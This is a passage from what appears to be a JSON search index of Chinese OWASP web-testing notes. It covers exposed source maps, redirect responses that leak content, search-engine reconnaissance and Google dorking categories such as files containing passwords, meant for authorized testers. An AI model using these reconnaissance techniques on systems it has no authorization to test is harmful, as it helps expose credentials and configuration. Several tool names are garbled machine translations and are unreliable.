\u6587\u4ef6\u7684\u6269\u5c55\u540d\u540e\u6dfb\u52a0\u201c.map\u201d\u6269\u5c55\u540d\u6765\u67e5\u627e\u6e90\u6620\u5c04\u6587\u4ef6\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6d4b\u8bd5\u4eba\u5458\u770b\u5230\u4e00\u4e2a<code>/static/js/main.chunk.js</code>\u6587\u4ef6\uff0c\u4ed6\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee<code>/static/js/main.chunk.js.map</code>.</p> <p>\u68c0\u67e5\u6e90\u6620\u5c04\u6587\u4ef6\u4e2d\u662f\u5426\u6709\u4efb\u4f55\u654f\u611f\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u66f4\u6df1\u5165\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\u3002\u4f8b\u5982\uff1a</p> <pre><code>{\n  \"version\": 3,\n  \"file\": \"static/js/main.chunk.js\",\n  \"sources\": [\n    \"/home/sysadmin/cashsystem/src/actions/index.js\",\n    \"/home/sysadmin/cashsystem/src/actions/reportAction.js\",\n    \"/home/sysadmin/cashsystem/src/actions/cashoutAction.js\",\n    \"/home/sysadmin/cashsystem/src/actions/userAction.js\",\n    \"...\"\n  ],\n  \"...\"\n}\n</code></pre> <p>\u5f53\u7f51\u7ad9\u52a0\u8f7d\u6e90\u6620\u5c04\u6587\u4ef6\u65f6\uff0c\u524d\u7aef\u6e90\u4ee3\u7801\u5c06\u53d8\u5f97\u53ef\u8bfb\u4e14\u66f4\u6613\u4e8e\u8c03\u8bd5\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_6","title":"\u8bc6\u522b\u6cc4\u6f0f\u4fe1\u606f\u7684\u91cd\u5b9a\u5411\u54cd\u5e94","text":"<p>\u5c3d\u7ba1\u91cd\u5b9a\u5411\u54cd\u5e94\u901a\u5e38\u4e0d\u4f1a\u5305\u542b\u4efb\u4f55\u91cd\u8981\u7684 Web \u5185\u5bb9\uff0c\u4f46\u4e0d\u80fd\u4fdd\u8bc1\u5b83\u4eec\u4e0d\u4f1a\u5305\u542b\u4efb\u4f55\u5185\u5bb9\u3002\u56e0\u6b64\uff0c\u867d\u7136 300 \u7cfb\u5217\uff08\u91cd\u5b9a\u5411\uff09\u54cd\u5e94\u901a\u5e38\u5305\u542b\u201c\u91cd\u5b9a\u5411\u5230<code>https://example.com/</code>\u201d\u7c7b\u578b\u7684\u5185\u5bb9\uff0c\u4f46\u5b83\u4eec\u4e5f\u53ef\u80fd\u4f1a\u6cc4\u9732\u5185\u5bb9\u3002</p> <p>\u8003\u8651\u91cd\u5b9a\u5411\u54cd\u5e94\u662f\u8eab\u4efd\u9a8c\u8bc1\u6216\u6388\u6743\u68c0\u67e5\u7684\u7ed3\u679c\u7684\u60c5\u51b5\uff0c\u5982\u679c\u8be5\u68c0\u67e5\u5931\u8d25\uff0c\u670d\u52a1\u5668\u53ef\u80fd\u4f1a\u54cd\u5e94\u5c06\u7528\u6237\u91cd\u5b9a\u5411\u56de\u201c\u5b89\u5168\u201d\u6216\u201c\u9ed8\u8ba4\u201d\u9875\u9762\uff0c\u4f46\u91cd\u5b9a\u5411\u54cd\u5e94\u672c\u8eab\u53ef\u80fd\u4ecd\u5305\u542b\u5185\u5bb9\u5b83\u6ca1\u6709\u5728\u6d4f\u89c8\u5668\u4e2d\u663e\u793a\uff0c\u4f46\u786e\u5b9e\u4f20\u8f93\u7ed9\u4e86\u5ba2\u6237\u7aef\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u6d4f\u89c8\u5668\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u6216\u901a\u8fc7\u4e2a\u4eba\u4ee3\u7406\uff08\u4f8b\u5982 ZAP\u3001Burp\u3001Fiddler \u6216 Charles\uff09\u6765\u5b9e\u73b0\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_7","title":"\u5de5\u5177","text":"<ul> <li>Wget</li> <li>\u6d4f\u89c8\u5668\u201c\u67e5\u770b\u6e90\u4ee3\u7801\u201d\u529f\u80fd</li> <li>\u773c\u7403</li> <li>\u5377\u66f2</li> <li>Zaproxy</li> <li>\u6253\u55dd\u5957\u4ef6</li> <li>\u8fd4\u56de\u7f51\u5740</li> <li>\u8c37\u6b4c\u5730\u56fe API \u626b\u63cf\u4eea</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_8","title":"\u53c2\u8003","text":"<ul> <li>\u94a5\u5319\u9ed1\u5ba2</li> <li>RingZer0 \u5728\u7ebf CTF\u00a0- \u6311\u6218 104 \u201c\u7ba1\u7406\u9762\u677f\u201d\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_9","title":"\u767d\u76ae\u4e66","text":"<ul> <li>HTML \u7248\u672c 4.01</li> <li>XHTML</li> <li>HTML \u7248\u672c 5</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%8B%E8%AF%95/","title":"\u5ba2\u6237\u7aef\u6d4b\u8bd5","text":"<p>\u6d4b\u8bd5\u57fa\u4e8e DOM \u7684\u8de8\u7ad9\u811a\u672c</p> <ul> <li>4.11.1.1\u6d4b\u8bd5\u57fa\u4e8e\u81ea DOM \u7684\u8de8\u7ad9\u811a\u672c</li> </ul> <p>4.11.2\u00a0JavaScript \u6267\u884c\u6d4b\u8bd5</p> <p>4.11.3\u00a0HTML \u6ce8\u5165\u6d4b\u8bd5</p> <p>4.11.4\u6d4b\u8bd5\u5ba2\u6237\u7aef URL \u91cd\u5b9a\u5411</p> <p>4.11.5\u00a0CSS\u6ce8\u5165\u6d4b\u8bd5</p> <p>4.11.6\u5ba2\u6237\u7aef\u8d44\u6e90\u64cd\u4f5c\u6d4b\u8bd5</p> <p>4.11.7\u6d4b\u8bd5\u8de8\u6e90\u8d44\u6e90\u5171\u4eab</p> <p>4.11.8\u8de8\u7ad9\u5237\u673a\u6d4b\u8bd5</p> <p>4.11.9\u70b9\u51fb\u52ab\u6301\u6d4b\u8bd5</p> <p>4.11.10\u6d4b\u8bd5 WebSocket</p> <p>4.11.11\u6d4b\u8bd5\u7f51\u7edc\u6d88\u606f</p> <p>4.11.12\u6d4b\u8bd5\u6d4f\u89c8\u5668\u5b58\u50a8</p> <p>4.11.13\u6d4b\u8bd5\u8de8\u7ad9\u811a\u672c\u5305\u542b</p> <p>4.11.14\u53cd\u5411 Tabnabbing \u6d4b\u8bd5</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/","title":"\u5bf9\u4fe1\u606f\u6cc4\u9732\u8fdb\u884c\u641c\u7d22\u5f15\u64ce\u53d1\u73b0\u4fa6\u5bdf","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_1","title":"\u6982\u62ec","text":"<p>\u4e3a\u4e86\u8ba9\u641c\u7d22\u5f15\u64ce\u5de5\u4f5c\uff0c\u8ba1\u7b97\u673a\u7a0b\u5e8f\uff08\u6216\uff09\u5b9a\u671f\u4ece\u7f51\u7edc\u4e0a\u7684\u6570\u5341\u4ebf\u9875\u9762\u4e2d<code>robots</code>\u83b7\u53d6\u6570\u636e\uff08\u79f0\u4e3a\u722c\u884c\uff09\u3002\u8fd9\u4e9b\u7a0b\u5e8f\u901a\u8fc7\u8ddf\u8e2a\u5176\u4ed6\u9875\u9762\u7684\u94fe\u63a5\u6216\u67e5\u770b\u7ad9\u70b9\u5730\u56fe\u6765\u67e5\u627e Web \u5185\u5bb9\u548c\u529f\u80fd\u3002\u5982\u679c\u4e00\u4e2a\u7f51\u7ad9\u4f7f\u7528\u4e00\u4e2a\u7279\u6b8a\u7684\u6587\u4ef6<code>robots.txt</code>\u6765\u5217\u51fa\u5b83\u4e0d\u5e0c\u671b\u641c\u7d22\u5f15\u64ce\u83b7\u53d6\u7684\u9875\u9762\uff0c\u90a3\u4e48\u5217\u51fa\u7684\u9875\u9762\u5c06\u88ab\u5ffd\u7565\u3002\u8fd9\u662f\u4e00\u4e2a\u57fa\u672c\u6982\u8ff0 - Google \u5bf9\u641c\u7d22\u5f15\u64ce\u7684\u5de5\u4f5c\u539f\u7406\u63d0\u4f9b\u4e86\u66f4\u6df1\u5165\u7684\u89e3\u91ca\u3002</p> <p>\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u5bf9\u7f51\u7ad9\u548c Web \u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u4fa6\u5bdf\u3002\u641c\u7d22\u5f15\u64ce\u53d1\u73b0\u548c\u4fa6\u5bdf\u6709\u76f4\u63a5\u548c\u95f4\u63a5\u7684\u8981\u7d20\uff1a\u76f4\u63a5\u65b9\u6cd5\u6d89\u53ca\u4ece\u7f13\u5b58\u4e2d\u641c\u7d22\u7d22\u5f15\u548c\u76f8\u5173\u5185\u5bb9\uff0c\u800c\u95f4\u63a5\u65b9\u6cd5\u6d89\u53ca\u901a\u8fc7\u641c\u7d22\u8bba\u575b\u3001\u65b0\u95fb\u7ec4\u548c\u62db\u6807\u7f51\u7ad9\u6765\u5b66\u4e60\u654f\u611f\u7684\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u3002</p> <p>\u4e00\u65e6\u641c\u7d22\u5f15\u64ce\u673a\u5668\u4eba\u5b8c\u6210\u722c\u884c\uff0c\u5b83\u5c31\u4f1a\u5f00\u59cb\u6839\u636e\u6807\u7b7e\u548c\u76f8\u5173\u5c5e\u6027\uff08\u4f8b\u5982 \uff09\u5bf9\u7f51\u9875\u5185\u5bb9\u7f16\u5236\u7d22\u5f15<code>&lt;TITLE&gt;</code>\uff0c\u4ee5\u4fbf\u8fd4\u56de\u76f8\u5173\u7684\u641c\u7d22\u7ed3\u679c\u3002\u5982\u679c<code>robots.txt</code>\u6587\u4ef6\u5728\u7f51\u7ad9\u7684\u751f\u547d\u5468\u671f\u5185\u6ca1\u6709\u66f4\u65b0\uff0c\u5e76\u4e14\u6ca1\u6709\u4f7f\u7528\u6307\u793a\u673a\u5668\u4eba\u4e0d\u7d22\u5f15\u5185\u5bb9\u7684\u5185\u8054 HTML \u5143\u6807\u8bb0\uff0c\u90a3\u4e48\u7d22\u5f15\u53ef\u80fd\u5305\u542b\u7f51\u7ad9\u4e0d\u6253\u7b97\u5305\u542b\u7684\u5185\u5bb9\u62e5\u6709\u8005\u3002\u7f51\u7ad9\u6240\u6709\u8005\u53ef\u4ee5\u4f7f\u7528\u524d\u9762\u63d0\u5230<code>robots.txt</code>\u7684 HTML \u5143\u6807\u8bb0\u3001\u8eab\u4efd\u9a8c\u8bc1\u548c\u641c\u7d22\u5f15\u64ce\u63d0\u4f9b\u7684\u5de5\u5177\u6765\u5220\u9664\u6b64\u7c7b\u5185\u5bb9\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u786e\u5b9a\u5e94\u7528\u7a0b\u5e8f\u3001\u7cfb\u7edf\u6216\u7ec4\u7ec7\u7684\u54ea\u4e9b\u654f\u611f\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u76f4\u63a5\uff08\u5728\u7ec4\u7ec7\u7684\u7f51\u7ad9\u4e0a\uff09\u6216\u95f4\u63a5\uff08\u901a\u8fc7\u7b2c\u4e09\u65b9\u670d\u52a1\uff09\u516c\u5f00\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u53ef\u80fd\u654f\u611f\u7684\u4fe1\u606f\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\uff1a</p> <ul> <li>\u7f51\u7edc\u56fe\u548c\u914d\u7f6e\uff1b</li> <li>\u7ba1\u7406\u5458\u6216\u5176\u4ed6\u4e3b\u8981\u5458\u5de5\u7684\u5b58\u6863\u5e16\u5b50\u548c\u7535\u5b50\u90ae\u4ef6\uff1b</li> <li>\u767b\u5f55\u7a0b\u5e8f\u548c\u7528\u6237\u540d\u683c\u5f0f\uff1b</li> <li>\u7528\u6237\u540d\u3001\u5bc6\u7801\u548c\u79c1\u94a5\uff1b</li> <li>\u7b2c\u4e09\u65b9\u6216\u4e91\u670d\u52a1\u914d\u7f6e\u6587\u4ef6\uff1b</li> <li>\u663e\u793a\u9519\u8bef\u4fe1\u606f\u5185\u5bb9\uff1b\u548c</li> <li>\u975e\u516c\u5171\u5e94\u7528\u7a0b\u5e8f\uff08\u5f00\u53d1\u3001\u6d4b\u8bd5\u3001\u7528\u6237\u9a8c\u6536\u6d4b\u8bd5 (UAT) \u548c\u7ad9\u70b9\u7684\u6682\u5b58\u7248\u672c\uff09\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_4","title":"\u641c\u7d22\u5f15\u64ce","text":"<p>\u4e0d\u8981\u5c06\u6d4b\u8bd5\u4ec5\u9650\u4e8e\u4e00\u4e2a\u641c\u7d22\u5f15\u64ce\u63d0\u4f9b\u5546\uff0c\u56e0\u4e3a\u4e0d\u540c\u7684\u641c\u7d22\u5f15\u64ce\u53ef\u80fd\u4f1a\u4ea7\u751f\u4e0d\u540c\u7684\u7ed3\u679c\u3002\u641c\u7d22\u5f15\u64ce\u7ed3\u679c\u53ef\u80fd\u4f1a\u5728\u51e0\u4e2a\u65b9\u9762\u6709\u6240\u4e0d\u540c\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u5f15\u64ce\u4e0a\u6b21\u6293\u53d6\u5185\u5bb9\u7684\u65f6\u95f4\uff0c\u4ee5\u53ca\u5f15\u64ce\u7528\u6765\u786e\u5b9a\u76f8\u5173\u9875\u9762\u7684\u7b97\u6cd5\u3002\u8003\u8651\u4f7f\u7528\u4ee5\u4e0b\uff08\u6309\u5b57\u6bcd\u987a\u5e8f\u5217\u51fa\u7684\uff09\u641c\u7d22\u5f15\u64ce\uff1a</p> <ul> <li>\u767e\u5ea6\uff0c\u4e2d\u56fd\u6700\u53d7\u6b22\u8fce\u7684\u641c\u7d22\u5f15\u64ce\u3002</li> <li>Bing\u662f\u5fae\u8f6f\u62e5\u6709\u548c\u8fd0\u8425\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u5168\u7403\u7b2c\u4e8c\u53d7\u6b22\u8fce\u3002\u652f\u6301\u9ad8\u7ea7\u641c\u7d22\u5173\u952e\u5b57\u3002</li> <li>binsearch.info\uff0c\u4e8c\u8fdb\u5236 Usenet \u65b0\u95fb\u7ec4\u7684\u641c\u7d22\u5f15\u64ce\u3002</li> <li>Common Crawl\uff0c\u201c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8bbf\u95ee\u548c\u5206\u6790\u7684\u7f51\u7edc\u722c\u866b\u6570\u636e\u7684\u5f00\u653e\u5b58\u50a8\u5e93\u3002\u201d</li> <li>DuckDuckGo\u662f\u4e00\u4e2a\u4ee5\u9690\u79c1\u4e3a\u4e2d\u5fc3\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u53ef\u4ee5\u4ece\u8bb8\u591a\u4e0d\u540c\u7684\u6765\u6e90\u7f16\u8bd1\u7ed3\u679c\u3002\u652f\u6301\u641c\u7d22\u8bed\u6cd5\u3002</li> <li>Google\u63d0\u4f9b\u4e16\u754c\u4e0a\u6700\u53d7\u6b22\u8fce\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u5e76\u4f7f\u7528\u6392\u540d\u7cfb\u7edf\u5c1d\u8bd5\u8fd4\u56de\u6700\u76f8\u5173\u7684\u7ed3\u679c\u3002\u652f\u6301\u641c\u7d22\u8fd0\u7b97\u7b26\u3002</li> <li>Internet Archive Wayback Machine\uff0c\u201c\u4ee5\u6570\u5b57\u5f62\u5f0f\u6784\u5efa\u4e92\u8054\u7f51\u7ad9\u70b9\u548c\u5176\u4ed6\u6587\u5316\u5236\u54c1\u7684\u6570\u5b57\u56fe\u4e66\u9986\u3002\u201d</li> <li>Shodan\uff0c\u4e00\u79cd\u7528\u4e8e\u641c\u7d22\u8054\u7f51\u8bbe\u5907\u548c\u670d\u52a1\u7684\u670d\u52a1\u3002\u4f7f\u7528\u9009\u9879\u5305\u62ec\u6709\u9650\u7684\u514d\u8d39\u8ba1\u5212\u4ee5\u53ca\u4ed8\u8d39\u8ba2\u9605\u8ba1\u5212\u3002</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_5","title":"\u641c\u7d22\u8fd0\u7b97\u7b26","text":"<p>\u641c\u7d22\u8fd0\u7b97\u7b26\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u5173\u952e\u5b57\u6216\u8bed\u6cd5\uff0c\u53ef\u6269\u5c55\u5e38\u89c4\u641c\u7d22\u67e5\u8be2\u7684\u529f\u80fd\uff0c\u5e76\u6709\u52a9\u4e8e\u83b7\u5f97\u66f4\u5177\u4f53\u7684\u7ed3\u679c\u3002\u5b83\u4eec\u901a\u5e38\u91c7\u7528<code>operator:query</code>.\u00a0\u4ee5\u4e0b\u662f\u4e00\u4e9b\u901a\u5e38\u652f\u6301\u7684\u641c\u7d22\u8fd0\u7b97\u7b26\uff1a</p> <ul> <li><code>site:</code>\u5c06\u641c\u7d22\u9650\u5236\u5728\u63d0\u4f9b\u7684\u57df\u4e2d\u3002</li> <li><code>inurl:</code>\u5c06\u53ea\u8fd4\u56de\u5728 URL \u4e2d\u5305\u542b\u5173\u952e\u5b57\u7684\u7ed3\u679c\u3002</li> <li><code>intitle:</code>\u53ea\u4f1a\u8fd4\u56de\u9875\u9762\u6807\u9898\u4e2d\u5305\u542b\u5173\u952e\u5b57\u7684\u7ed3\u679c\u3002</li> <li><code>intext:</code>\u6216\u8005<code>inbody:</code>\u53ea\u4f1a\u5728\u9875\u9762\u6b63\u6587\u4e2d\u641c\u7d22\u5173\u952e\u5b57\u3002</li> <li><code>filetype:</code>\u5c06\u4ec5\u5339\u914d\u7279\u5b9a\u6587\u4ef6\u7c7b\u578b\uff0c\u5373<code>.png</code>, \u6216<code>.php</code>.</li> </ul> <p>\u4f8b\u5982\uff0c\u8981\u67e5\u627e\u7531\u5178\u578b\u641c\u7d22\u5f15\u64ce\u7d22\u5f15\u7684 owasp.org \u7684 Web \u5185\u5bb9\uff0c\u6240\u9700\u8bed\u6cd5\u4e3a\uff1a</p> <pre><code>site:owasp.org\n</code></pre> <p> \u56fe 4.1.1-1\uff1aGoogle \u7ad9\u70b9\u64cd\u4f5c\u641c\u7d22\u7ed3\u679c\u793a\u4f8b</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_6","title":"\u67e5\u770b\u7f13\u5b58\u5185\u5bb9","text":"<p>\u8981\u641c\u7d22\u4ee5\u524d\u5df2\u7f16\u5165\u7d22\u5f15\u7684\u5185\u5bb9\uff0c\u8bf7\u4f7f\u7528<code>cache:</code>\u8fd0\u7b97\u7b26\u3002\u8fd9\u6709\u52a9\u4e8e\u67e5\u770b\u81ea\u7d22\u5f15\u4ee5\u6765\u53ef\u80fd\u5df2\u66f4\u6539\u7684\u5185\u5bb9\uff0c\u6216\u8005\u53ef\u80fd\u4e0d\u518d\u53ef\u7528\u7684\u5185\u5bb9\u3002\u5e76\u975e\u6240\u6709\u641c\u7d22\u5f15\u64ce\u90fd\u63d0\u4f9b\u7f13\u5b58\u5185\u5bb9\u8fdb\u884c\u641c\u7d22\uff1b\u5728\u64b0\u5199\u672c\u6587\u65f6\u6700\u6709\u7528\u7684\u6765\u6e90\u662f\u8c37\u6b4c\u3002</p> <p>\u8981<code>owasp.org</code>\u5728\u7f13\u5b58\u65f6\u67e5\u770b\uff0c\u8bed\u6cd5\u4e3a\uff1a</p> <pre><code>cache:owasp.org\n</code></pre> <p> \u56fe 4.1.1-2\uff1a\u8c37\u6b4c\u7f13\u5b58\u64cd\u4f5c\u641c\u7d22\u7ed3\u679c\u793a\u4f8b</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#dorking","title":"\u8c37\u6b4c\u9ed1\u5ba2\uff0c\u6216 Dorking","text":"<p>\u5f53\u4e0e\u6d4b\u8bd5\u4eba\u5458\u7684\u521b\u9020\u529b\u76f8\u7ed3\u5408\u65f6\uff0c\u4f7f\u7528\u8fd0\u7b97\u7b26\u8fdb\u884c\u641c\u7d22\u53ef\u80fd\u662f\u4e00\u79cd\u975e\u5e38\u6709\u6548\u7684\u53d1\u73b0\u6280\u672f\u3002\u53ef\u4ee5\u94fe\u63a5\u8fd0\u7b97\u7b26\u4ee5\u6709\u6548\u5730\u53d1\u73b0\u7279\u5b9a\u79cd\u7c7b\u7684\u654f\u611f\u6587\u4ef6\u548c\u4fe1\u606f\u3002\u8fd9\u79cd\u79f0\u4e3aGoogle hacking\u6216 Dorking \u7684\u6280\u672f\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u641c\u7d22\u5f15\u64ce\uff0c\u53ea\u8981\u652f\u6301\u641c\u7d22\u8fd0\u7b97\u7b26\u3002</p> <p>\u8bf8\u5982Google Hacking Database\u4e4b\u7c7b\u7684 dorks \u6570\u636e\u5e93\u662f\u4e00\u79cd\u6709\u7528\u7684\u8d44\u6e90\uff0c\u53ef\u4ee5\u5e2e\u52a9\u53d1\u73b0\u7279\u5b9a\u4fe1\u606f\u3002\u8be5\u6570\u636e\u5e93\u4e2d\u53ef\u7528\u7684\u4e00\u4e9b\u7c7b\u522b\u7684 dorks \u5305\u62ec\uff1a</p> <ul> <li>\u7acb\u8db3\u70b9</li> <li>\u5305\u542b\u7528\u6237\u540d\u7684\u6587\u4ef6</li> <li>\u654f\u611f\u76ee\u5f55</li> <li>Web \u670d\u52a1\u5668\u68c0\u6d4b</li> <li>\u6613\u53d7\u653b\u51fb\u7684\u6587\u4ef6</li> <li>\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5668</li> <li>\u9519\u8bef\u4fe1\u606f</li> <li>\u5305\u542b\u591a\u6c41\u4fe1\u606f\u7684\u6587\u4ef6</li> <li>\u5305\u542b\u5bc6\u7801\u7684\u6587\u4ef6</li> <li>\u654f\u611f\u7684\u5728\u7ebf\u8d2d\u7269\u4fe1\u606f</li> </ul>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%AF%B9%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E8%BF%9B%E8%A1%8C%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%8F%91%E7%8E%B0%E4%BE%A6%E5%AF%9F/#_7","title":"\u6574\u6cbb","text":"<p>\u5728\u5c06\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u53d1\u5e03\u5230\u7f51\u4e0a\u4e4b\u524d\uff0c\u8bf7\u4ed4\u7ec6\u8003\u8651\u5176\u654f\u611f\u6027\u3002</p> <p>\u5b9a\u671f\u5ba1\u67e5\u5728\u7ebf\u53d1\u5e03\u7684\u73b0\u6709\u8bbe\u8ba1\u548c\u914d\u7f6e\u4fe1\u606f\u7684\u654f\u611f\u6027\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E5%BC%B1%E5%AF%86%E7%A0%81%E6%B5%8B%E8%AF%95/","title":"\u5f31\u5bc6\u7801\u6d4b\u8bd5","text":"<p>\u5f31\u4f20\u8f93\u5c42\u5b89\u5168\u6d4b\u8bd5</p> <p>4.9.2\u00a0Padding Oracle\u6d4b\u8bd5</p> <p>4.9.3\u6d4b\u8bd5\u901a\u8fc7\u672a\u52a0\u5bc6\u901a\u9053\u53d1\u9001\u7684\u654f\u611f\u4fe1\u606f</p> <p>4.9.4\u5f31\u52a0\u5bc6\u6d4b\u8bd5</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/","title":"\u6307\u7eb9 Web \u5e94\u7528\u7a0b\u5e8f\u6846\u67b6","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OWASP%20WEB%20%E7%AC%94%E8%AE%B0/%E6%8C%87%E7%BA%B9%20Web%20%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%A1%86%E6%9E%B6/#_1","title":"\u6982\u62ec","text":"<p>\u592a\u9633\u5e95\u4e0b\u6ca1\u6709\u65b0\u9c9c\u4e8b\uff0c\u4eba\u4eec\u53ef\u80fd\u60f3\u5230\u8981\u5f00\u53d1\u7684\u51e0\u4e4e\u6240\u6709 Web 